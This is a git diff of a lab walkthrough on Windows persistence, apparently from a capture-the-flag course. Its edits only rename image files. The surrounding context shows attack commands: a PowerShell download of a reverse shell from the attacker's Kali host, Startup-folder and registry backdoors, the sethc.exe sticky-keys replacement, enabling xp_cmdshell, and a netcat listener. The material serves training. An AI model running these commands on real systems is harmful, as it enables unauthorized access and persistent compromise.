@@ -145,7 +145,7 @@ To open the configuration window for WinRM's security descriptor, you can use th
 
 This will open a window where you can add thmuser2 and assign it full privileges to connect to WinRM.
 
-<figure><img src="../../.gitbook/assets/image (6) (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (6) (3) (1).png" alt=""><figcaption></figcaption></figure>
 
 Once we have done this, our user can connect via WinRM. Since the user has the SeBackup and SeRestore privileges, we can repeat the steps to recover the password hashes from the SAM and connect back with the Administrator user.
 
@@ -347,9 +347,9 @@ powershell "(New-Object System.Net.WebClient).Downloadfile('http://$KALI:81/rev-
 </strong><strong>sc.exe start THMservice2
 </strong></code></pre>
 
-<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (9) (2).png" alt=""><figcaption></figcaption></figure>
 
 ### Modifying existing services
 
@@ -538,7 +538,7 @@ copy revshell.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\
 
 Now be sure to sign out of your session from the start menu (closing the RDP window is not enough as it leaves your session open).
 
-<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (8) (2).png" alt=""><figcaption></figcaption></figure>
 
 And log back via RDP. You should immediately receive a connection back to your attacker's machine.
 
@@ -602,7 +602,7 @@ Note: While in a real-world set-up you could use any name for your registry entr
 
 After doing this, sign out of your current session and log in again, and you should receive a shell (it will probably take around 10-20 seconds).
 
-<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (6) (3).png" alt=""><figcaption></figcaption></figure>
 
 ### Winlogon
 
@@ -717,7 +717,7 @@ Notice that this registry key has no equivalent in HKLM, making your backdoor ap
 
 After doing this, sign out of your current session and log in again, and you should receive a shell (it will probably take around 10 seconds).
 
-<figure><img src="../../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (21) (1).png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -783,7 +783,7 @@ copy c:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
 
 After doing so, lock your session from the start menu.
 
-![](<../../.gitbook/assets/image (5).png>)
+![](<../../.gitbook/assets/image (5) (3).png>)
 
 You should now be able to press `SHIFT` five times to access a terminal with SYSTEM privileges directly from the login screen.
 
@@ -874,7 +874,7 @@ To enable it, let's open `Microsoft SQL Server Management Studio 18`, available 
 
 Once logged in, click on the New Query button to open the query editor:
 
-<figure><img src="../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1) (3).png" alt=""><figcaption></figcaption></figure>
 
 Run the following SQL sentences to enable the "Advanced Options" in the MSSQL configuration, and proceed to enable `xp_cmdshell`.
 
@@ -951,7 +951,7 @@ nc -lvp 4454
 
 With all that ready, let's navigate to `http://$VICTIM/` and insert an employee into the web application. Since the web application will send an INSERT statement to the database, our TRIGGER will provide us access to the system's console.
 
-<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (10) (4).png" alt=""><figcaption></figcaption></figure>
 
 
 
